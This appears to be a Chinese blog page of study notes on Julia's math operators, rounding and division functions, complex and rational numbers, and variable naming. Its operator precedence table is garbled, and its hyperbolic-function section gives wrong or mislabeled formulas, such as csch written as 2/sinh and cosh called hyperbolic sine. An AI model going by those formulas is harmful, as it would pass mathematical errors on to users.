<h3 id="向量化“点”运算符"><a href="#向量化“点”运算符" class="headerlink" title="向量化“点”运算符"></a>向量化“点”运算符</h3><p><strong>每个</strong>二元运算符都有一个 “点” 运算符与之对应，例如 <code>^</code> 就有对应的 <code>.^</code> 存在。这个对应的 <code>.^</code> 被 Julia <strong>自动地</strong>定义为逐元素地执行 <code>^</code> 运算。比如 <code>[1,2,3] ^ 3</code> 是非法的，因为数学上没有给（长宽不一样的）数组的立方下过定义。但是 <code>[1,2,3] .^ 3</code> 在 Julia 里是合法的，它会逐元素地执行 <code>^</code> 运算（或称向量化运算），得到 <code>[1^3, 2^3, 3^3]</code>。类似地，<code>!</code> 或 <code>√</code> 这样的一元运算符，也都有一个对应的 <code>.√</code> 用于执行逐元素运算。<br><img src="/2023/01/30/julia/image-20230302185121741.png" alt="image-20230302185121741"></p>
<p>使用<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/arrays/#Base.Broadcast.@__dot__"><code>@.</code></a> 宏，<code>@. 2A^2 + sin(A)</code>），Julia 只对 <code>A</code> 进行做<em>一次</em>循环，遍历 <code>A</code> 中的每个元素 <code>a</code> 并计算 <code>2a^2 + sin(a)</code>。特别的，类似 <code>f.(g.(x))</code> 的嵌套点运算调用也是融合的，并且“相邻的”二元运算符表达式 <code>x .+ 3 .* x.^2</code> 可以等价转换为嵌套 dot 调用：<code>(+).(x, (*).(3, (^).(x, 2)))</code>。</p>
<p>逐点赋值运算符，类似 <code>a .+= b</code>（或者 <code>@. a += b</code>）会被解析成 <code>a .= a .+ b</code></p>
<p>必须明确的用空格消除歧义</p>
<h3 id="数值比较"><a href="#数值比较" class="headerlink" title="数值比较"></a>数值比较</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">操作符</th>
<th style="text-align:left">名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:=="><code>==</code></a></td>
<td style="text-align:left">相等</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:!="><code>!=</code></a>, <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:!="><code>≠</code></a></td>
<td style="text-align:left">不等</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:&lt;"><code>&lt;</code></a></td>
<td style="text-align:left">小于</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:&lt;="><code>&lt;=</code></a>, <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:&lt;="><code>≤</code></a></td>
<td style="text-align:left">小于等于</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:"><code>&gt;</code></a></td>
<td style="text-align:left">大于</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:&gt;="><code>&gt;=</code></a>, <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.:&gt;="><code>≥</code></a></td>
<td style="text-align:left">大于等于</td>
</tr>
</tbody>
</table>
</div>
<p>整数的比较方式是标准的按位比较，而浮点数的比较方式则遵循IEEE 754标准。</p>
<ul>
<li>有限数的大小顺序，和我们所熟知的相同。</li>
<li><code>+0</code> 等于但不大于 <code>-0</code>.</li>
<li><code>Inf</code> 等于自身，并且大于除了 <code>NaN</code> 外的所有数。</li>
<li><code>-Inf</code> 等于自身，并且小于除了 <code>NaN</code> 外的所有数。</li>
<li><code>NaN</code> 不等于、不小于且不大于任何数值，包括它自己。</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">测试是否满足如下性质</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Base.isequal"><code>isequal(x, y)</code></a></td>
<td style="text-align:left"><code>x</code> 与 <code>y</code> 是完全相同的</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.isfinite"><code>isfinite(x)</code></a></td>
<td style="text-align:left"><code>x</code> 是有限大的数字</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.isinf"><code>isinf(x)</code></a></td>
<td style="text-align:left"><code>x</code> 是（正/负）无穷大</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.isnan"><code>isnan(x)</code></a></td>
<td style="text-align:left"><code>x</code> 是 <code>NaN</code></td>
</tr>
</tbody>
</table>
</div>
<p>注：isequal认为NaN之间是相等的，且可以用来区分带符号的0<br><img src="/2023/01/30/julia/image-20230302185648538.png" alt="image-20230302185648538"><img src="/2023/01/30/julia/image-20230302185741072.png" alt="image-20230302185741072"></p>
<h3 id="链式比较"><a href="#链式比较" class="headerlink" title="链式比较"></a>链式比较</h3><p><img src="/2023/01/30/julia/image-20230302185920289.png" alt="image-20230302185920289"></p>
<h3 id="初等函数"><a href="#初等函数" class="headerlink" title="初等函数"></a>初等函数</h3><p>ulia 提供了强大的数学函数和运算符集合。这些数学运算定义在各种合理的数值上，包括整型、浮点数、分数和复数，只要这些定义有数学意义就行。</p>
<p>而且，和其它 Julia 函数一样，这些函数也能通过 <a href="https://cn.julialang.org/JuliaZH.jl/latest/manual/functions/#man-vectorized">点语法</a> <code>f.(A)</code> 以“向量化”的方式作用于数组和其它集合上。 比如，<code>sin.(A)</code> 会计算 <code>A</code> 中每个元素的 sin 值。<br><img src="/2023/01/30/julia/image-20230302190605010.png" alt="image-20230302190605010"><br><img src="/2023/01/30/julia/image-20230302190637515.png" alt="image-20230302190637515"><br><img src="/2023/01/30/julia/image-20230302190709217.png" alt="image-20230302190709217"></p>
<h3 id="运算符的优先级和结合性"><a href="#运算符的优先级和结合性" class="headerlink" title="运算符的优先级和结合性"></a>运算符的优先级和结合性</h3><p>从高到低，Julia 运算符的优先级与结合性为：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">分类</th>
<th style="text-align:left">运算符</th>
<th style="text-align:left">结合性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">语法</td>
<td style="text-align:left"><code>.</code> followed by <code>::</code></td>
<td style="text-align:left">左结合</td>
</tr>
<tr>
<td style="text-align:left">幂运算</td>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">右结合</td>
</tr>
<tr>
<td style="text-align:left">一元运算符</td>
<td style="text-align:left"><code>+ - √</code></td>
<td style="text-align:left">右结合</td>
</tr>
<tr>
<td style="text-align:left">移位运算</td>
<td style="text-align:left"><code>&lt;&lt; &gt;&gt; &gt;&gt;&gt;</code></td>
<td style="text-align:left">左结合</td>
</tr>
<tr>
<td style="text-align:left">除法</td>
<td style="text-align:left"><code>//</code></td>
<td style="text-align:left">左结合</td>
</tr>
<tr>
<td style="text-align:left">乘法</td>
<td style="text-align:left"><code>* / % &amp; \ ÷</code></td>
<td style="text-align:left">左结合</td>
</tr>
<tr>
<td style="text-align:left">加法</td>
<td style="text-align:left">`+ -</td>
<td style="text-align:left">⊻`</td>
<td>左结合</td>
</tr>
<tr>
<td style="text-align:left">语法</td>
<td style="text-align:left"><code>: ..</code></td>
<td style="text-align:left">左结合</td>
</tr>
<tr>
<td style="text-align:left">语法</td>
<td style="text-align:left">`</td>
<td style="text-align:left">&gt;`</td>
<td>左结合</td>
</tr>
<tr>
<td style="text-align:left">语法</td>
<td style="text-align:left">`&lt;</td>
<td style="text-align:left">`</td>
<td>右结合</td>
</tr>
<tr>
<td style="text-align:left">比较</td>
<td style="text-align:left"><code>&gt; &lt; &gt;= &lt;= == === != !== &lt;:</code></td>
<td style="text-align:left">无结合性</td>
</tr>
<tr>
<td style="text-align:left">流程控制</td>
<td style="text-align:left"><code>&amp;&amp;</code> followed by `</td>
<td style="text-align:left"></td>
<td><code>followed by</code>?`</td>
<td>右结合</td>
</tr>
<tr>
<td style="text-align:left">Pair 操作</td>
<td style="text-align:left"><code>=&gt;</code></td>
<td style="text-align:left">右结合</td>
</tr>
<tr>
<td style="text-align:left">赋值</td>
<td style="text-align:left">`= += -= *= /= //= \= ^= ÷= %=</td>
<td style="text-align:left">= &amp;= ⊻= &lt;&lt;= &gt;&gt;= &gt;&gt;&gt;=`</td>
<td>右结合</td>
</tr>
</tbody>
</table>
</div>
<p>eg：2x^2 与 2^2x<br><img src="/2023/01/30/julia/image-20230302191418279.png" alt="image-20230302191418279"></p>
<p>并列解析就像一元运算符，它在指数周围具有相同的自然不对称性：<code>-x^y</code> 和 <code>2x^y</code>解析为 <code>-(x^y)</code> 和 <code>2(x^y)</code> 而 <code>x^-y</code> 和 <code>x^2y</code> 解析为<code>x^(-y)</code> 和 <code>x^(2y)</code>。</p>
<h3 id="数值转换"><a href="#数值转换" class="headerlink" title="数值转换"></a>数值转换</h3><ul>
<li><code>T(x)</code> 和 <code>convert(T,x)</code> 都会把 <code>x</code> 转换为 <code>T</code>类型。<ul>
<li>如果 <code>T</code> 是浮点类型，转换的结果就是最近的可表示值， 可能会是正负无穷大。</li>
<li>如果 <code>T</code> 为整数类型，当 <code>x</code> 不能由 <code>T</code> 类型表示时，会抛出 <code>InexactError</code>。</li>
</ul>
</li>
<li><code>x % T</code> 将整数 <code>x</code> 转换为整型 <code>T</code>，与 <code>x</code> 模 <code>2^n</code> 的结果一致，其中 <code>n</code> 是 <code>T</code> 的位数。换句话说，在二进制表示下被截掉了一部分。</li>
<li><a href="https://cn.julialang.org/JuliaZH.jl/latest/manual/mathematical-operations/#舍入函数">舍入函数</a> 接收一个 <code>T</code> 类型的可选参数。比如，<code>round(Int,x)</code> 是 <code>Int(round(x))</code> 的简写版。</li>
</ul>
<p><img src="/2023/01/30/julia/image-20230302192150332.png" alt="image-20230302192150332" style="zoom:115%;"><img src="/2023/01/30/julia/image-20230302192202939.png" alt="image-20230302192202939"><br><img src="/2023/01/30/julia/image-20230302192252846.png" alt="image-20230302192252846"><img src="/2023/01/30/julia/image-20230302192842350.png" alt="image-20230302192842350"><br><img src="/2023/01/30/julia/image-20230302192302382.png" alt="image-20230302192302382"></p>
<h2 id="2-4-数学函数"><a href="#2-4-数学函数" class="headerlink" title="2.4 数学函数"></a>2.4 数学函数</h2><script type="math/tex; mode=display">
log(x,y):求log_xy\\
exp(x):求e^x\\
sqrt(x):求\sqrt{x}\\
sin(x):</script><h3 id="舍入函数"><a href="#舍入函数" class="headerlink" title="舍入函数"></a>舍入函数</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">返回类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.round-Tuple{Type, Any}"><code>round(x)</code></a></td>
<td style="text-align:left"><code>x</code> 舍到最接近的整数</td>
<td style="text-align:left"><code>typeof(x)</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.round-Tuple{Type, Any}"><code>round(T, x)</code></a></td>
<td style="text-align:left"><code>x</code> 舍到最接近的整数</td>
<td style="text-align:left"><code>T</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.floor"><code>floor(x)</code></a></td>
<td style="text-align:left"><code>x</code> 向 <code>-Inf</code> 舍入</td>
<td style="text-align:left"><code>typeof(x)</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.floor"><code>floor(T, x)</code></a></td>
<td style="text-align:left"><code>x</code> 向 <code>-Inf</code> 舍入</td>
<td style="text-align:left"><code>T</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.ceil"><code>ceil(x)</code></a></td>
<td style="text-align:left"><code>x</code> 向 <code>+Inf</code> 方向取整</td>
<td style="text-align:left"><code>typeof(x)</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.ceil"><code>ceil(T, x)</code></a></td>
<td style="text-align:left"><code>x</code> 向 <code>+Inf</code> 方向取整</td>
<td style="text-align:left"><code>T</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.trunc"><code>trunc(x)</code></a></td>
<td style="text-align:left"><code>x</code> 向 0 取整</td>
<td style="text-align:left"><code>typeof(x)</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.trunc"><code>trunc(T, x)</code></a></td>
<td style="text-align:left"><code>x</code> 向 0 取整</td>
<td style="text-align:left"><code>T</code></td>
</tr>
</tbody>
</table>
</div>
<h3 id="除法函数"><a href="#除法函数" class="headerlink" title="除法函数"></a>除法函数</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.div"><code>div(x,y)</code></a>, <code>x÷y</code></td>
<td style="text-align:left">截断除法；商向零近似</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.fld"><code>fld(x,y)</code></a></td>
<td style="text-align:left">向下取整除法；商向 <code>-Inf</code> 近似</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.cld"><code>cld(x,y)</code></a></td>
<td style="text-align:left">向上取整除法；商向 <code>+Inf</code> 近似</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.rem"><code>rem(x,y)</code></a></td>
<td style="text-align:left">取余；满足 <code>x == div(x,y)*y + rem(x,y)</code>；符号与 <code>x</code> 一致</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.mod"><code>mod(x,y)</code></a></td>
<td style="text-align:left">取模；满足 <code>x == fld(x,y)*y + mod(x,y)</code>；符号与 <code>y</code> 一致</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.mod1"><code>mod1(x,y)</code></a></td>
<td style="text-align:left">偏移 1 的 <code>mod</code>；若 <code>y&gt;0</code>，则返回 <code>r∈(0,y]</code>，若 <code>y&lt;0</code>，则 <code>r∈[y,0)</code> 且满足 <code>mod(r, y) == mod(x, y)</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.Math.mod2pi"><code>mod2pi(x)</code></a></td>
<td style="text-align:left">对 2pi 取模；<code>0 &lt;= mod2pi(x) &lt; 2pi</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.divrem"><code>divrem(x,y)</code></a></td>
<td style="text-align:left">返回 <code>(div(x,y),rem(x,y))</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.fldmod"><code>fldmod(x,y)</code></a></td>
<td style="text-align:left">返回 <code>(fld(x,y),mod(x,y))</code></td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.gcd"><code>gcd(x,y...)</code></a></td>
<td style="text-align:left"><code>x</code>, <code>y</code>,… 的最大公约数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.lcm"><code>lcm(x,y...)</code></a></td>
<td style="text-align:left"><code>x</code>, <code>y</code>,… 的最小公倍数</td>
</tr>
</tbody>
</table>
</div>
<h3 id="符号和绝对值函数"><a href="#符号和绝对值函数" class="headerlink" title="符号和绝对值函数"></a>符号和绝对值函数</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.abs"><code>abs(x)</code></a></td>
<td style="text-align:left"><code>x</code> 的模</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.abs2"><code>abs2(x)</code></a></td>
<td style="text-align:left"><code>x</code> 的模的平方</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.sign"><code>sign(x)</code></a></td>
<td style="text-align:left">表示 <code>x</code> 的符号，返回 -1，0，或 +1</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.signbit"><code>signbit(x)</code></a></td>
<td style="text-align:left">表示符号位是 true 或 false</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.copysign"><code>copysign(x,y)</code></a></td>
<td style="text-align:left">返回一个数，其值等于 <code>x</code> 的模，符号与 <code>y</code> 一致</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.flipsign"><code>flipsign(x,y)</code></a></td>
<td style="text-align:left">返回一个数，其值等于 <code>x</code> 的模，符号与 <code>x*y</code> 一致</td>
</tr>
</tbody>
</table>
</div>
<p><img src="/2023/01/30/julia/image-20230302210937768.png" alt="image-20230302210937768"></p>
<h3 id="幂、对数与平方根"><a href="#幂、对数与平方根" class="headerlink" title="幂、对数与平方根"></a>幂、对数与平方根</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.sqrt-Tuple{Real}"><code>sqrt(x)</code></a>, <code>√x</code></td>
<td style="text-align:left"><code>x</code> 的平方根</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.Math.cbrt"><code>cbrt(x)</code></a>, <code>∛x</code></td>
<td style="text-align:left"><code>x</code> 的立方根</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.Math.hypot"><code>hypot(x,y)</code></a></td>
<td style="text-align:left">当直角边的长度为 <code>x</code> 和 <code>y</code>时，直角三角形斜边的长度</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.exp-Tuple{Float64}"><code>exp(x)</code></a></td>
<td style="text-align:left">自然指数函数在 <code>x</code> 处的值</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.expm1"><code>expm1(x)</code></a></td>
<td style="text-align:left">当 <code>x</code> 接近 0 时的 <code>exp(x)-1</code> 的精确值</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.Math.ldexp"><code>ldexp(Float,Int)</code></a></td>
<td style="text-align:left"><code>x*2^n</code> 的高效算法，<code>n</code> 为整数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.log-Tuple{Number}"><code>log(x)</code></a></td>
<td style="text-align:left"><code>x</code> 的自然对数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.log-Tuple{Number}"><code>log(b,x)</code></a></td>
<td style="text-align:left">以 <code>b</code> 为底 <code>x</code> 的对数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.log2"><code>log2(x)</code></a></td>
<td style="text-align:left">以 2 为底 <code>x</code> 的对数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.log10"><code>log10(x)</code></a></td>
<td style="text-align:left">以 10 为底 <code>x</code> 的对数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.log1p"><code>log1p(x)</code></a></td>
<td style="text-align:left">当 <code>x</code>接近 0 时的 <code>log(1+x)</code> 的精确值</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.Math.exponent"><code>exponent(x)</code></a></td>
<td style="text-align:left"><code>x</code> 的二进制指数</td>
</tr>
<tr>
<td style="text-align:left"><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.Math.significand"><code>significand(x)</code></a></td>
<td style="text-align:left">浮点数 <code>x</code> 的二进制有效数（也就是尾数）</td>
</tr>
</tbody>
</table>
</div>
<p><img src="/2023/01/30/julia/image-20230302211836746.png" alt="image-20230302211836746"></p>
<h3 id="三角和双曲函数"><a href="#三角和双曲函数" class="headerlink" title="三角和双曲函数"></a>三角和双曲函数</h3><h4 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sin    cos    tan    cot    sec    csc</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/30/julia/image-20230302212645494.png" alt="image-20230302212645494"></p>
<h4 id="反三角函数"><a href="#反三角函数" class="headerlink" title="反三角函数"></a>反三角函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asin   acos   atan   acot   asec   acsc</span><br></pre></td></tr></table></figure>
<h4 id="双曲函数"><a href="#双曲函数" class="headerlink" title="双曲函数"></a>双曲函数</h4><ul>
<li>双曲正弦函数：$sinh(x) = e^x - e^{-x}/2$<br><img src="/2023/01/30/julia/image-20230302213153935.png" alt="image-20230302213153935"> </li>
<li>双曲正弦函数：$cosh(x) = e^x + e^{-x}/2$<br><img src="/2023/01/30/julia/image-20230302213348554.png" alt="image-20230302213348554"></li>
<li>双曲正切函数：$cosh(x) = sinh(x)/cosh(x)$\</li>
<li>双曲余割函数：$csch(x) = 2/sinh(x)$</li>
<li>双曲正割函数：$csch(x) = 2/cosh(x)$</li>
<li>双曲余切函数：$csch(x) = 1/tanh(x)$</li>
</ul>
<h4 id="反双曲函数"><a href="#反双曲函数" class="headerlink" title="反双曲函数"></a>反双曲函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asinh  acosh  atanh  acoth  asech  acsch</span><br></pre></td></tr></table></figure>
<h4 id="辛格函数"><a href="#辛格函数" class="headerlink" title="辛格函数"></a>辛格函数</h4><p>归一化：$sinc(x)={sin(\pi x)}/{\pi x}$<br>非归一化：$sinc(x)={sin(x)}/{x}$</p>
<p><img src="/2023/01/30/julia/image-20230302214151119.png" alt="image-20230302214151119"></p>
<p>$cosc(x)={cos(\pi x)}/{\pi x}$</p>
<h2 id="2-5-复数和有理数"><a href="#2-5-复数和有理数" class="headerlink" title="2.5 复数和有理数"></a>2.5 复数和有理数</h2><h3 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h3><p>全局变量im被绑定到复数i，表示-1的主平方根<br><img src="/2023/01/30/julia/image-20230303081339084.png" alt="image-20230303081339084"></p>
<h4 id="标准函数"><a href="#标准函数" class="headerlink" title="标准函数"></a>标准函数</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">real()</td>
<td style="text-align:center">z的实部</td>
</tr>
<tr>
<td style="text-align:left">imag()</td>
<td style="text-align:center">z的虚部</td>
</tr>
<tr>
<td style="text-align:left">conj()</td>
<td style="text-align:center">z的复共轭</td>
</tr>
<tr>
<td style="text-align:left">abs()</td>
<td style="text-align:center">z的绝对值</td>
</tr>
<tr>
<td style="text-align:left">abs2()</td>
<td style="text-align:center">取平方后的绝对值</td>
</tr>
<tr>
<td style="text-align:left">angle()</td>
<td style="text-align:center">以弧度为单位的相位角</td>
</tr>
</tbody>
</table>
</div>
<p>注意数学函数通常应用于实数就返回实数值，应用于复数就返回复数值。例如，当 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.sqrt-Tuple{Real}"><code>sqrt</code></a> 应用于 <code>-1</code> 与 <code>-1 + 0im</code> 会有不同的表现，虽然 <code>-1 == -1 + 0im</code>：</p>
<h4 id="complex"><a href="#complex" class="headerlink" title="complex()"></a>complex()</h4><p>使用更高效的complex函数直接通过实部与虚部构建一个复数值<br><img src="/2023/01/30/julia/image-20230303082135374.png" alt="image-20230303082135374"></p>
<p><a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.Inf"><code>Inf</code></a> 和 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.NaN"><code>NaN</code></a> 可能出现在复数的实部和虚部<br><img src="/2023/01/30/julia/image-20230303082216123.png" alt="image-20230303082216123"></p>
<h3 id="有理数"><a href="#有理数" class="headerlink" title="有理数"></a>有理数</h3><p>有一个用于表示整数精确比值的分数类型。分数通过 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/math/#Base.://"><code>//</code></a> 运算符构建，且如果一个分数的分子和分母含有公因子，它们会被约分到最简形式且分母非负：<br><img src="/2023/01/30/julia/image-20230303082342697.png" alt="image-20230303082342697"><img src="/2023/01/30/julia/image-20230303082350651.png" alt="image-20230303082350651"><img src="/2023/01/30/julia/image-20230303082411430.png" alt="image-20230303082411430"></p>
<h4 id="转换为浮点数"><a href="#转换为浮点数" class="headerlink" title="转换为浮点数"></a>转换为浮点数</h4><p><img src="/2023/01/30/julia/image-20230303082715823.png" alt="image-20230303082715823"></p>
<p>且对任意整数值 <code>a</code> 和 <code>b</code>（除了 <code>a == 0</code> 且 <code>b == 0</code> 时），从分数到浮点数的转换遵从以下的一致性：<img src="/2023/01/30/julia/image-20230303082837710.png" alt="image-20230303082837710"></p>
<p>Julia接受构建无穷分数值：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="number">5</span>//<span class="number">0</span></span></span><br><span class="line"><span class="language-julia"></span>1//0</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> x = -<span class="number">3</span>//<span class="number">0</span></span></span><br><span class="line"><span class="language-julia"></span>-1//0</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> typeof(x)</span></span><br><span class="line"><span class="language-julia"></span>Rational&#123;Int64&#125;</span><br></pre></td></tr></table></figure>
<p>但不接受试图构建一个 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Base.NaN"><code>NaN</code></a> 分数值：</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="number">0</span>//<span class="number">0</span></span></span><br><span class="line"><span class="language-julia"></span>ERROR: ArgumentError: invalid rational: zero(Int64)//zero(Int64)</span><br><span class="line">Stacktrace:</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<h2 id="2-6-变量"><a href="#2-6-变量" class="headerlink" title="2.6 变量"></a>2.6 变量</h2><h3 id="2-6-1-命名规则"><a href="#2-6-1-命名规则" class="headerlink" title="2.6.1 命名规则"></a>2.6.1 命名规则</h3><p>Julia 提供了非常灵活的变量命名策略。变量名是大小写敏感的，且不包含语义，意思是说，Julia 不会根据变量的名字来区别对待它们。 （译者注：Julia <strong>不会</strong>自动将全大写的变量识别为常量，也<strong>不会</strong>将有特定前后缀的变量自动识别为某种特定类型的变量，即不会根据变量名字，自动判断变量的任何属性。）<br><img src="/2023/01/30/julia/image-20230222103257140.png" alt="image-20230222103257140"></p>
<p>也可以使用UTF-8编码的Unicode字符作为变量名<br><img src="/2023/01/30/julia/image-20230222103444529.png" alt="image-20230222103444529"></p>
<p>julia允许重定义内置常量和函数（但有可能引发潜在的混淆），但是不允许重定义一个正在使用的内置常量或函数。<br><img src="/2023/01/30/julia/image-20230222103639576.png" alt="image-20230222103639576"><img src="/2023/01/30/julia/image-20230222103757279.png" alt="image-20230222103757279" style="zoom:67%;"></p>
<h3 id="2-6-2合法的变量名"><a href="#2-6-2合法的变量名" class="headerlink" title="2.6.2合法的变量名"></a>2.6.2合法的变量名</h3><p>变量名字必须以英文字母（A-Z 或 a-z）、下划线或编码大于 00A0 的 Unicode 字符的一个子集开头。 具体来说指的是，<a href="http://www.fileformat.info/info/unicode/category/index.htm">Unicode字符分类</a>中的 Lu/Ll/Lt/Lm/Lo/Nl（字母）、Sc/So（货币和其他符号）以及一些其它像字母的符号（例如 Sm 类别数学符号中的一部分）。 变量名的非首字符还允许使用惊叹号 <code>!</code>、数字（包括 0-9 和其他 Nd/No 类别中的 Unicode 字符）以及其它 Unicode 字符：变音符号和其他修改标记（Mn/Mc/Me/Sk 类别）、标点和连接符（Pc 类别）、引号和少许其他字符。</p>
